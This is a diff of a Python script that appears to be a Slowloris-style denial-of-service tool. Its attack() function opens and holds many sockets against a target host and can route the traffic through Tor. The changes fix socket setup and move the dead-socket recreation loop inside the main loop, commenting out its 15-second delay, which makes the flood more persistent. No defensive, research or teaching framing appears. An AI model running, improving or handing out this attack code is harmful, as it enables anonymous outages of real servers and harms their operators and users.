@@ -10,7 +10,7 @@ from random import randint, choice
 # Initializes a connection with specified options
 def init_connection(target, port, randomize, https, user_agents):
     # Create the new socket
-    sock = socket.socket(AF_INET, SOCK_STREAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(5)
     # Wrap socket if https is required
     if https:
@@ -65,7 +65,7 @@ def attack(target, port, threads, randomize, https, tor, proxy, quiet):
             import socks
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, 'localhost', 9050)
             socket.socket = socks.socksocket
-            logging.info("Tor enabled on "+proxy_host+":"+proxy_port)
+            logging.info("Tor enabled on localhost:9050")
         except ImportError:
             logging.error("Socks proxy library not found...")
 
@@ -120,9 +120,11 @@ def attack(target, port, threads, randomize, https, tor, proxy, quiet):
 
     # Inform user the script has started
     logging.info("Target: %s \tThreads: %s", target, threads)
+    time.sleep(3)
 
     logging.info("Creating sockets...")
-    
+    time.sleep(1)
+
     # Start connecting with the target
     for i in range(threads):
         try:
@@ -142,16 +144,16 @@ def attack(target, port, threads, randomize, https, tor, proxy, quiet):
                 # Remove socket from list if dead connection
                 sockets.remove(sock)
 
-    # Recreate dead sockets
-    for i in range(threads - len(sockets)):
-        logging.debug("Recreating dead sockets...")
-        try:
-            sock = init_connection(target, port, randomize, https, user_agents)
-            if sock:
-                sockets.append(sock)
-        except socket.error:
-            break
-        time.sleep(15)
+        # Recreate dead sockets
+        for i in range(threads - len(sockets)):
+            logging.debug("Recreating dead sockets...")
+            try:
+                sock = init_connection(target, port, randomize, https, user_agents)
+                if sock:
+                    sockets.append(sock)
+            except socket.error:
+                break
+            #time.sleep(15)
 
 
 if __name__ == '__main__':
